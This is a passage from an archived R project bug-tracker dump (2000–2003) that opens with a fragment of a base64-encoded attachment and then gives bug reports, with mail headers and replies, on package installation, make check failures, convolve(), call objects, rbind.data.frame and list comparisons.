IGRpcmVjdG9yaWVzIGluIFBBVEggdGhhdCBzdGFydCB3aXRoIGEgdGlsZGUu
DQogICAgICAgICAtLXNob3ctZG90ICAgICAgIERvbid0IGV4cGFuZCBhIGRv
dCB0byBjdXJyZW50IGRpcmVjdG9yeSBpbiBvdXRwdXQuDQogICAgICAgICAt
LXNob3ctdGlsZGUgICAgIE91dHB1dCBhIHRpbGRlIGZvciBIT01FIGRpcmVj
dG9yeSBmb3Igbm9uLXJvb3QuDQogICAgICAgICAtLXR0eS1vbmx5ICAgICAg
IFN0b3AgcHJvY2Vzc2luZyBvcHRpb25zIG9uIHRoZSByaWdodCBpZiBub3Qg
b24gdHR5Lg0KICAgICAgICAgLS1hbGwsIC1hICAgICAgICBQcmludCBhbGwg
bWF0Y2hlcyBpbiBQQVRILCBub3QganVzdCB0aGUgZmlyc3QNCiAgICAgICAg
IC0tcmVhZC1hbGlhcywgLWkgUmVhZCBsaXN0IG9mIGFsaWFzZXMgZnJvbSBz
dGRpbi4NCiAgICAgICAgIC0tc2tpcC1hbGlhcyAgICAgSWdub3JlIG9wdGlv
biAtLXJlYWQtYWxpYXM7IGRvbid0IHJlYWQgc3RkaW4uDQogICAgICAgICAt
LXJlYWQtZnVuY3Rpb25zIFJlYWQgc2hlbGwgZnVuY3Rpb25zIGZyb20gc3Rk
aW4uDQogICAgICAgICAtLXNraXAtZnVuY3Rpb25zIElnbm9yZSBvcHRpb24g
LS1yZWFkLWZ1bmN0aW9uczsgZG9uJ3QgcmVhZCBzdGRpbi4NClVzYWdlOiB3
aGljaCBbb3B0aW9uc10gWy0tXSBwcm9ncmFtbmFtZSBbLi4uXQ0KT3B0aW9u
czogLS12ZXJzaW9uLCAtW3ZWXSBQcmludCB2ZXJzaW9uIGFuZCBleGl0IHN1
Y2Nlc3NmdWxseS4NCiAgICAgICAgIC0taGVscCwgICAgICAgICAgUHJpbnQg
dGhpcyBoZWxwIGFuZCBleGl0IHN1Y2Nlc3NmdWxseS4NCiAgICAgICAgIC0t
c2tpcC1kb3QgICAgICAgU2tpcCBkaXJlY3RvcmllcyBpbiBQQVRIIHRoYXQg
c3RhcnQgd2l0aCBhIGRvdC4NCiAgICAgICAgIC0tc2tpcC10aWxkZSAgICAg
U2tpcCBkaXJlY3RvcmllcyBpbiBQQVRIIHRoYXQgc3RhcnQgd2l0aCBhIHRp
bGRlLg0KICAgICAgICAgLS1zaG93LWRvdCAgICAgICBEb24ndCBleHBhbmQg
YSBkb3QgdG8gY3VycmVudCBkaXJlY3RvcnkgaW4gb3V0cHV0Lg0KICAgICAg
ICAgLS1zaG93LXRpbGRlICAgICBPdXRwdXQgYSB0aWxkZSBmb3IgSE9NRSBk
aXJlY3RvcnkgZm9yIG5vbi1yb290Lg0KICAgICAgICAgLS10dHktb25seSAg
ICAgICBTdG9wIHByb2Nlc3Npbmcgb3B0aW9ucyBvbiB0aGUgcmlnaHQgaWYg
bm90IG9uIHR0eS4NCiAgICAgICAgIC0tYWxsLCAtYSAgICAgICAgUHJpbnQg
YWxsIG1hdGNoZXMgaW4gUEFUSCwgbm90IGp1c3QgdGhlIGZpcnN0DQogICAg
ICAgICAtLXJlYWQtYWxpYXMsIC1pIFJlYWQgbGlzdCBvZiBhbGlhc2VzIGZy
b20gc3RkaW4uDQogICAgICAgICAtLXNraXAtYWxpYXMgICAgIElnbm9yZSBv
cHRpb24gLS1yZWFkLWFsaWFzOyBkb24ndCByZWFkIHN0ZGluLg0KICAgICAg
ICAgLS1yZWFkLWZ1bmN0aW9ucyBSZWFkIHNoZWxsIGZ1bmN0aW9ucyBmcm9t
IHN0ZGluLg0KICAgICAgICAgLS1za2lwLWZ1bmN0aW9ucyBJZ25vcmUgb3B0
aW9uIC0tcmVhZC1mdW5jdGlvbnM7IGRvbid0IHJlYWQgc3RkaW4uDQpjb25m
aWd1cmU6IFdBUk5JTkc6IEkgY291bGQgbm90IGRldGVybWluZSBDUElDRkxB
R1MuDQpjb25maWd1cmU6IGVycm9yOiBTZWUgdGhlIGZpbGUgSU5TVEFMTCBm
b3IgbW9yZSBpbmZvcm1hdGlvbi4NCg==
---559023410-959030623-1050952576=:23064--


==> 2808.audit <==
Thu May 29 09:42:14 2003	ripley	changed notes
Thu May 29 09:42:14 2003	ripley	foobar
Thu May 29 09:42:14 2003	ripley	moved from incoming to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2878 *
Subject: Problem with R CMD INSTALL and package versions
From: rpeng@stat.ucla.edu
Date: Wed, 30 Apr 2003 08:23:12 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2878 <==
From rpeng@stat.ucla.edu Wed Apr 30 08:23:13 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3U6NC2b000284
	for <R-bugs@biostat.ku.dk>; Wed, 30 Apr 2003 08:23:13 +0200 (MET DST)
Date: Wed, 30 Apr 2003 08:23:12 +0200 (MET DST)
Message-Id: <200304300623.h3U6NC2b000284@pubhealth.ku.dk>
From: rpeng@stat.ucla.edu
To: R-bugs@biostat.ku.dk
Subject: Problem with R CMD INSTALL and package versions

Full_Name: Roger Peng
Version: 1.7.0
OS: Linux (Red Hat 8.0)
Submission from: (NULL) (68.64.112.179)


There seems to be a problem with R CMD INSTALL using --with-package-versions. 
First, when using --save and --with-package-versions together, I get the
following output (in this case, for the `snow' package):

--

marla:> R CMD INSTALL --save --with-package-versions snow_0.1-1.tar.gz 
* Installing *source* package 'snow' as 'snow_0.1-1' ...
** R
** inst
** save image
cat: /home/rpeng/install/R-1.7.0/lib/R/library/snow_0.1-1/R/snow: No such file
or directory

mv: cannot stat `/home/rpeng/install/R-1.7.0/lib/R/library/snow_0.1-1/R/snow':
No such file or directory
** help
 >>> Building/Updating help pages for package 'snow'
     Formats: text html latex example 
  snow-cluster                      text    html    latex   example
  snow-internal                     text    html    latex
  snow-parallel                     text    html    latex   example
  snow-rand                         text    html    latex   example
  snow-startstop                    text    html    latex   example
* DONE (snow)

* DONE (INSTALL)

--

When trying to load the package in R, I get:

> library(snow, version = "0.1-1")
Error in .path.package("snow") : none of the packages are loaded
Error in library(snow, version = "0.1-1") : 
        .First.lib failed

Using install.packages() with `installWithVers = TRUE' produces the same
problem.  Removing the --with-package-versions flag makes the package install as
expected.  Removing the --save flag (but keeping the --with-package-versions
flag) gets rid of the complaint during the install process, but I get the same
error when trying to load the package in R.  

I haven't tried this with too many packages but I alwasy get the same behavior. 
I first noticed this when trying to install `pixmap' and `gpclib' packages with
versions since they are both installed using --save.

-roger

==> 2878.audit <==
Thu May 22 23:01:16 2003	thomas	moved from incoming to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3282 *
Subject: 1.7.1 make check fails
From: "Richard A. O'Keefe" <ok@cs.otago.ac.nz>
Date: Wed, 18 Jun 2003 17:31:21 +1200 (NZST)
--problem with tcltk--await further information
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3282 <==
From mailnull@stat.math.ethz.ch Wed Jun 18 07:32:04 2003
Received: from stat.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h5I5W3JH010771
	for <R-bugs@biostat.ku.dk>; Wed, 18 Jun 2003 07:32:03 +0200 (MET DST)
Received: from stat.math.ethz.ch (localhost [127.0.0.1])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h5I5Vt4U016515
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Wed, 18 Jun 2003 07:31:56 +0200 (MEST)
Received: (from mailnull@localhost)
	by stat.math.ethz.ch (8.12.9/8.12.6/Submit) id h5I5VtGV016514
	for R-bugs@biostat.ku.dk; Wed, 18 Jun 2003 07:31:55 +0200 (MEST)
Received: from franz.stat.wisc.edu (www.omegahat.org [128.105.174.32])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h5I5Vn4T016494
	for <r-bugs@lists.r-project.org>; Wed, 18 Jun 2003 07:31:50 +0200 (MEST)
Received: from mailhub1.otago.ac.nz ([139.80.64.218])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 19SVYA-0007iY-00
	for <r-bugs@r-project.org>; Wed, 18 Jun 2003 00:32:02 -0500
Received: (from root@localhost)
	by mailhub1.otago.ac.nz (8.12.9/8.12.9) id h5I5VM1a021671
	for r-bugs@r-project.org; Wed, 18 Jun 2003 17:31:22 +1200
Received: from atlas.otago.ac.nz (atlas.otago.ac.nz [139.80.32.250])
	by mailhub1.otago.ac.nz (8.12.9/8.12.9) with ESMTP id h5I5VMJ7021645
	for <r-bugs@r-project.org>; Wed, 18 Jun 2003 17:31:22 +1200
Received: (from ok@localhost)
	by atlas.otago.ac.nz (8.12.9/8.12.9) id h5I5VLRj448487
	for r-bugs@r-project.org; Wed, 18 Jun 2003 17:31:21 +1200 (NZST)
Date: Wed, 18 Jun 2003 17:31:21 +1200 (NZST)
From: "Richard A. O'Keefe" <ok@cs.otago.ac.nz>
Message-Id: <200306180531.h5I5VLRj448487@atlas.otago.ac.nz>
To: r-bugs@r-project.org
Subject: 1.7.1 make check fails
X-scanner: scanned by Inflex 1.0.12.7
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=0.0 required=5.0 tests=none version=2.54
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.54 (1.174.2.17-2003-05-11-exp)

uname -a => SunOS frege 5.9 Generic_112233-04 sun4u sparc SUNW,Sun-Blade-100
Today I downloaded R-1.7.1.tgz,
unpacked it,
did ./configure
and ran make.
All apparently went well.
Then I did make check.
On rerunning make check (because I forgot to save the output the first
time), I get

f% make check
`Makedeps' is up to date.
`base-Ex.Rout' is up to date.
`ctest-Ex.Rout' is up to date.
`eda-Ex.Rout' is up to date.
`lqs-Ex.Rout' is up to date.
`methods-Ex.Rout' is up to date.
`modreg-Ex.Rout' is up to date.
`mva-Ex.Rout' is up to date.
`nls-Ex.Rout' is up to date.
`splines-Ex.Rout' is up to date.
`stepfun-Ex.Rout' is up to date.
running code in 'tcltk-Ex.R' ...*** Error code 1
make: Fatal error: Command failed for target `tcltk-Ex.Rout'
Current working directory /home/users/okeefe_r/commands.d/sources/stats/R-1.7.1/tests/Examples
*** Error code 1
make: Fatal error: Command failed for target `test-Examples-Base'
Current working directory /home/users/okeefe_r/commands.d/sources/stats/R-1.7.1/tests/Examples
*** Error code 1
make: Fatal error: Command failed for target `test-Examples'
Current working directory /home/users/okeefe_r/commands.d/sources/stats/R-1.7.1/tests
*** Error code 1
make: Fatal error: Command failed for target `test-all-basics'
Current working directory /home/users/okeefe_r/commands.d/sources/stats/R-1.7.1/tests
*** Error code 1
make: Fatal error: Command failed for target `check'

What's going on here?  How worried should I be?  What do I need to fix?

Will R work if I tell it to use Sun's C, C++, and Fortran compilers?
How do I tell it to do that?


==> 3282.followup.1 <==
From ripley@stats.ox.ac.uk Wed Jun 18 08:08:59 2003
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h5I68wJH010919
	for <R-bugs@biostat.ku.dk>; Wed, 18 Jun 2003 08:08:59 +0200 (MET DST)
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.12.9/8.12.9) with ESMTP id h5I68wVh002660;
	Wed, 18 Jun 2003 07:08:58 +0100 (BST)
Date: Wed, 18 Jun 2003 07:08:58 +0100 (BST)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender: ripley@gannet.stats
To: ok@cs.otago.ac.nz
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] 1.7.1 make check fails (PR#3282)
In-Reply-To: <200306180532.h5I5W5JH010775@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.44.0306180703060.27947-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

Where is the bug? 

Please ask on R-help for help installing R, after reading the R-admin
manual to which the INSTALL file refers you.

On Wed, 18 Jun 2003 ok@cs.otago.ac.nz wrote:

> uname -a => SunOS frege 5.9 Generic_112233-04 sun4u sparc SUNW,Sun-Blade-100
> Today I downloaded R-1.7.1.tgz,
> unpacked it,
> did ./configure
> and ran make.
> All apparently went well.
> Then I did make check.
> On rerunning make check (because I forgot to save the output the first
> time), I get
> 
> f% make check
> `Makedeps' is up to date.
> `base-Ex.Rout' is up to date.
> `ctest-Ex.Rout' is up to date.
> `eda-Ex.Rout' is up to date.
> `lqs-Ex.Rout' is up to date.
> `methods-Ex.Rout' is up to date.
> `modreg-Ex.Rout' is up to date.
> `mva-Ex.Rout' is up to date.
> `nls-Ex.Rout' is up to date.
> `splines-Ex.Rout' is up to date.
> `stepfun-Ex.Rout' is up to date.
> running code in 'tcltk-Ex.R' ...*** Error code 1
> make: Fatal error: Command failed for target `tcltk-Ex.Rout'
> Current working directory /home/users/okeefe_r/commands.d/sources/stats/R-1.7.1/tests/Examples
> *** Error code 1
> make: Fatal error: Command failed for target `test-Examples-Base'
> Current working directory /home/users/okeefe_r/commands.d/sources/stats/R-1.7.1/tests/Examples
> *** Error code 1
> make: Fatal error: Command failed for target `test-Examples'
> Current working directory /home/users/okeefe_r/commands.d/sources/stats/R-1.7.1/tests
> *** Error code 1
> make: Fatal error: Command failed for target `test-all-basics'
> Current working directory /home/users/okeefe_r/commands.d/sources/stats/R-1.7.1/tests
> *** Error code 1
> make: Fatal error: Command failed for target `check'
> 
> What's going on here?  How worried should I be?  What do I need to fix?

You need to read tests/Examples/tcltk-Ex.Rout.fail to find out.
My guess is that your Tcl/Tk installation is not complete/compatible with 
your compilers/....  You could build without Tcl/Tk if you don't want it.

> Will R work if I tell it to use Sun's C, C++, and Fortran compilers?
> How do I tell it to do that?

Yes.  This is in the R-admin manual, which the INSTALL file asks you to
read. It discusses Tcl/Tk compatibility issues too, and how to build
without it.

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272866 (PA)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 3282.audit <==
Wed Jun 18 17:18:52 2003	ripley	changed notes
Wed Jun 18 17:18:52 2003	ripley	foobar
Wed Jun 18 17:18:52 2003	ripley	moved from incoming to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Language

* PR# 408 *
Subject: convolution bug
From: wsimpson@gcal.ac.uk
Date: Fri, 28 Jan 2000 11:17:36 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 408 <==
From wsimpson@gcal.ac.uk  Fri Jan 28 11:17:36 2000
Received: from localhost (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA11325
	for <R-bugs@biostat.ku.dk>; Fri, 28 Jan 2000 11:17:36 +0100 (MET)
Date: Fri, 28 Jan 2000 11:17:36 +0100 (MET)
From: wsimpson@gcal.ac.uk
Message-Id: <200001281017.LAA11325@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: convolution bug

Full_Name: Bill Simpson
Version: 65.1 , 0.90.1
OS: Linux
Submission from: (NULL) (193.62.250.209)


I reported this on r-help, but here is official bug report.

The present convolve() does not do convolution by default. Its default behaviour
is
correlation. This is a bug.

The default argument conj should be set to FALSE.

The zero-padding should be on the right for linear convolution (don't ask me
why you call this type="open"; I suggest type="linear").

Here is what I expect linear convolution to do:
myconvolve<-function (x,h) 
{
    nx <- length(x)
    nh <- length(h)
    #zero pad
    if(nx>nh)
       {
       x <- c(x,rep(0, nh-1))
       h<-c(h,rep(0,nx-1))
       }
    else
       {
       h <- c(h,rep(0, nx-1))
       x<-c(x,rep(0,nh-1))
       }
    x <- fft(fft(x) * fft(h), inv = TRUE)
    Re(x)/length(x)
#I am not sure about this, the R IFFT is weird
}

What "circular" convolution should do is just
eliminate the zero-padding:

myconvolve2<-function (x,h)
{
#no padding, circular convolution
    nx <- length(x)
    nh <- length(h)
    x <- fft(fft(x) * fft(h), inv = TRUE)
    Re(x)/(nx)
}


I suggest that you create two functions, convolve() and correlate(), and get
rid
of the conj argument in convolve().

==> 408.audit <==
Wed Feb 16 19:28:42 2000	ripley	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 412 *
Subject: anomalies with call objects
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 06 Feb 2000 01:18:50 +0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 412 <==
From postmaster@franz.stat.wisc.edu  Sun Feb  6 01:16:33 2000
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id BAA26868
	for <R-bugs@biostat.ku.dk>; Sun, 6 Feb 2000 01:16:31 +0100 (MET)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id BAA18080
	for <r-bugs@hypatia.math.ethz.ch>; Sun, 6 Feb 2000 01:16:38 +0100 (MET)
Received: from franz.stat.wisc.edu(128.105.174.95)
 via SMTP by hypatia, id smtpdAAAa004QS; Sun Feb  6 01:16:33 2000
Received: from pubhealth.ku.dk (really [130.225.108.10]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m12HFNP-000ZSxC@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <r-bugs@r-project.org>; Sat, 5 Feb 2000 18:16:31 -0600 (CST) 
Received: from biostat.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id BAA26864
	for <r-bugs@r-project.org>; Sun, 6 Feb 2000 01:16:18 +0100 (MET)
Received: (from pd@localhost)
	by biostat.ku.dk (8.9.3/8.9.3) id BAA12311;
	Sun, 6 Feb 2000 01:18:51 +0100
Sender: pd@blueberry.kubism.ku.dk
To: r-bugs@r-project.org
Subject: anomalies with call objects
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 06 Feb 2000 01:18:50 +0100
Message-ID: <x2900zyyhh.fsf@blueberry.kubism.ku.dk>
Lines: 51
X-Mailer: Gnus v5.7/Emacs 20.4
Mime-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit


Call objects don't always behave as you'd expect. They're mostly
list-like, but with exceptions:

> f<-function(x,y,...)match.call(expand.dots=FALSE)
> xx <- f(y=1,2,z=3,4)
> dd <- xx$...
> xx$... <- NULL
> c(xx,dd)
[[1]]
f(x = 2, y = 1)

$z
[1] 3

[[3]]
[1] 4

> as.call(c(as.list(xx),dd))
f(x = 2, y = 1, z = 3, 4)

(Splus has this rather differently, since dd becomes a call to list()
rather than a list of promises:

S> c(xx,dd)
f(x = 2, y = 1, list, z = 3, 4)
S> as.call(c(as.list(xx),dd))
f(x = 2, y = 1, list, z = 3, 4)

...but at least gives the same in both cases)

Also, the names of arguments added with [[<- is getting dropped if a
new element is required:

> xx[["abc"]]<-123
> xx
f(x = 2, y = 1, 123)

S has what I'd expect there:

S> xx[["abc"]]<-123
S> xx
f(x = 2, y = 1, abc = 123)

[R-0.99.0 prerelease on RedHat6.1, but this is likely not a new thing.]

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 412.audit <==
Wed Feb 16 19:26:57 2000	ripley	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 669 *
Subject: Bug(s) w/ rbind.data.frame(); fix also read.table(*, as.is = TRUE) ?
From: Martin Maechler <maechler@stat.math.ethz.ch>
Date: Mon, 25 Sep 2000 10:17:15 +0200
--status of AsIs columns
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 669 <==
From maechler@stat.math.ethz.ch  Mon Sep 25 10:17:01 2000
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA01907
	for <R-bugs@biostat.ku.dk>; Mon, 25 Sep 2000 10:17:01 +0200 (MET DST)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id KAA07627
	for <R-bugs@stat.math.ethz.ch>; Mon, 25 Sep 2000 10:17:19 +0200 (MET DST)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa001r9; Mon Sep 25 10:17:15 2000
Received: (maechler@localhost) by lynne.ethz.ch (8.9.3/D-MATH-client) id KAA01475; Mon, 25 Sep 2000 10:17:15 +0200
X-Authentication-Warning: lynne.ethz.ch: maechler set sender to maechler@stat.math.ethz.ch using -f
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <14799.2571.494467.836722@gargle.gargle.HOWL>
Date: Mon, 25 Sep 2000 10:17:15 +0200
To: R-bugs@stat.math.ethz.ch
Subject: Bug(s) w/ rbind.data.frame(); fix also read.table(*, as.is = TRUE) ?
X-Mailer: VM 6.76 under Emacs 20.7.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

This is not only bug report, but also a RFC (request for comments):

The basic problem is that there are (at least) two ways of easily getting
non-factor character columns in data.frames.
The first is  
    read.table(*, as.is = TRUE) 
and the second is
    data.frame(.., I(...), ..)	      

which differ in their result. Whereas the first produces `pure' character
columns in the data.frame, the second approach gives `AsIs' classed
columns (character, or, e.g. logical).

Now, as the following shows,  rbind.data.frame()  *is* buggy anyway,
I wonder if we shouldn't change read.table(*, as.is = TRUE)
such that the non-numeric columns of its result become "AsIs" classed as
well:

-----------

str(d1 <- data.frame(a=1:3, b = I(letters[1:3])))
## d1 is `alright'
## d0: The same but a `character' *not* protected by AsIs:
d0 <- d1
d0$b <- unclass(d0$b)
str(d0)
## Note that this is *really* the same as a what you get from
##  read.table(*, as.is = TRUE)
##  ----------
##  R's read.table() is S+ compatible; however I wonder if
##  we shouldn't add  "AsIs" classes to all non-numeric components...
##  the classes, shouldn't harm, but ensure consistency of treatment..

str(d11 <- rbind(d1, new = c(7, "N"))) ## alright
str(d01 <- rbind(d0, new = c(7, "N"))) ## all wrong :
## Both columns were coerced to factors !!
##-- S-PLUS 5 coerces both to "character" -- which is better,
##  since the new row *is* all character

## R makes nonsense with 'b' [factor w/ 1 level "N": NA NA NA 1]
## S+ 5.1 does exactly the right thing [both a & b still look like in d0,d1 :
str(d12 <- rbind(d1, new = data.frame(a= 7, b="N")))##
str(d02 <- rbind(d0, new = data.frame(a= 7, b="N")))##

---------

Martin Maechler <maechler@stat.math.ethz.ch>	http://stat.ethz.ch/~maechler/
Seminar fuer Statistik, ETH-Zentrum  LEO D10	Leonhardstr. 27
ETH (Federal Inst. Technology)	8092 Zurich	SWITZERLAND
phone: x-41-1-632-3408		fax: ...-1228			<><

==> 669.audit <==
Wed Oct 25 20:31:21 2000	ripley	changed notes
Wed Oct 25 20:31:21 2000	ripley	foobar
Wed Oct 25 20:31:21 2000	ripley	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1073 *
Subject: Wierd problem comparing numeric values and list using ==
From: "Warnes, Gregory R" <gregory_r_warnes@groton.pfizer.com>
Date: Fri, 24 Aug 2001 22:07:41 -0400
--see also PR#1075
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1073 <==
From postmaster@franz.stat.wisc.edu  Sat Aug 25 04:08:02 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id EAA03646
	for <r-bugs@biostat.ku.dk>; Sat, 25 Aug 2001 04:08:01 +0200 (MET DST)
Received: from mailrelay1.pfizer.com (really [192.77.198.2]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m15aSrf-000JIlC@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Fri, 24 Aug 2001 21:07:59 -0500 (CDT) 
Received: from gsun56.pfizer.com (localhost [127.0.0.1])
	by mailrelay1.pfizer.com (8.9.3/Pro-8.9.3) with ESMTP id WAA09177
	for <r-bugs@r-project.org>; Fri, 24 Aug 2001 22:07:43 -0400 (EDT)
Received: from groexms01.pfizer.com (localhost [127.0.0.1])
	by gsun56.pfizer.com (Pro-8.9.3/Pro-8.9.3) with ESMTP id WAA24921
	for <r-bugs@r-project.org>; Fri, 24 Aug 2001 22:08:07 -0400 (EDT)
Received: from groexcncr05.pfizer.com (unverified) by groexms01.pfizer.com
 (Content Technologies SMTPRS 4.2.1) with ESMTP id <T559305f66fac1e08e203f@groexms01.pfizer.com> for <r-bugs@r-project.org>;
 Fri, 24 Aug 2001 22:07:41 -0400
Received: by groexcncr05.pfizer.com with Internet Mail Service (5.5.2650.21)
	id <R3ZPXZDF>; Fri, 24 Aug 2001 22:07:41 -0400
Message-ID: <5429125E11E4D411AF7300805FE603A8014CED55@groexmbcr02.pfizer.com>
From: "Warnes, Gregory R" <gregory_r_warnes@groton.pfizer.com>
To: "'r-bugs@r-project.org'" <r-bugs@r-project.org>
Subject: Wierd problem comparing numeric values and list using ==
Date: Fri, 24 Aug 2001 22:07:41 -0400
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2650.21)
Content-Type: text/plain; charset="ISO-8859-1"


Under R 1.3.0 on Solaris and Windows NT  there seems to be a bug in == when
applied to elements of a list, particularly when one of the elements is of
mode integer:

	> list(1) == list(1)
	[1] FALSE
	> 1 == list(1)
	[1] TRUE
	> as.integer(1)==list(as.integer(1))
	[1] FALSE
	> as.integer(1)==list(as.double(1))
	[1] FALSE
	> list(as.integer(1))==list(as.integer(1))
	[1] FALSE
	> list(as.integer(1))==as.integer(1)
	[1] FALSE
	> list(as.double(1))==list(as.double(1))
	[1] FALSE

However, these cases work:

	> as.double(1)==list(as.integer(1))
	[1] TRUE
	> list(as.integer(1))==as.double(1)
	[1] TRUE

Replacing the bare integer/double with a vector constructed with c() doesn't
change the results, and comparing between vectors created with c() appears
correct.

-Greg

--please do not edit the information below--

Version:
 platform = i386-pc-mingw32
 arch = x86
 os = Win32
 system = x86, Win32
 status = 
 major = 1
 minor = 3.0
 year = 2001
 month = 06
 day = 22
 language = R

Windows NT 4.0 (build 1381) Service Pack 5

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base


LEGAL NOTICE
Unless expressly stated otherwise, this message is confidential and may be privileged. It is intended for the addressee(s) only. Access to this E-mail by anyone else is unauthorized. If you are not an addressee, any disclosure or copying of the contents of this E-mail or any action taken (or not taken) in reliance on it is unauthorized and may be unlawful. If you are not an addressee, please inform the sender immediately.

==> 1073.reply.1 <==
From p.dalgaard@biostat.ku.dk  Sat Aug 25 15:58:26 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA04833;
	Sat, 25 Aug 2001 15:58:25 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id f7PDv9r21975;
	Sat, 25 Aug 2001 15:57:09 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: gregory_r_warnes@groton.pfizer.com
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] Wierd problem comparing numeric values and list using == (PR#1073)
References: <200108250208.EAA03656@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 25 Aug 2001 15:57:09 +0200
In-Reply-To: <200108250208.EAA03656@pubhealth.ku.dk>
Message-ID: <x23d6gmedm.fsf@blueberry.kubism.ku.dk>
Lines: 57
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

gregory_r_warnes@groton.pfizer.com writes:

> Under R 1.3.0 on Solaris and Windows NT  there seems to be a bug in == when
> applied to elements of a list, particularly when one of the elements is of
> mode integer:
> 
> 	> list(1) == list(1)
> 	[1] FALSE
> 	> 1 == list(1)
> 	[1] TRUE
> 	> as.integer(1)==list(as.integer(1))
> 	[1] FALSE
> 	> as.integer(1)==list(as.double(1))
> 	[1] FALSE
> 	> list(as.integer(1))==list(as.integer(1))
> 	[1] FALSE
> 	> list(as.integer(1))==as.integer(1)
> 	[1] FALSE
> 	> list(as.double(1))==list(as.double(1))
> 	[1] FALSE
> 
> However, these cases work:
> 
> 	> as.double(1)==list(as.integer(1))
> 	[1] TRUE
> 	> list(as.integer(1))==as.double(1)
> 	[1] TRUE
> 
> Replacing the bare integer/double with a vector constructed with c() doesn't
> change the results, and comparing between vectors created with c() appears
> correct.

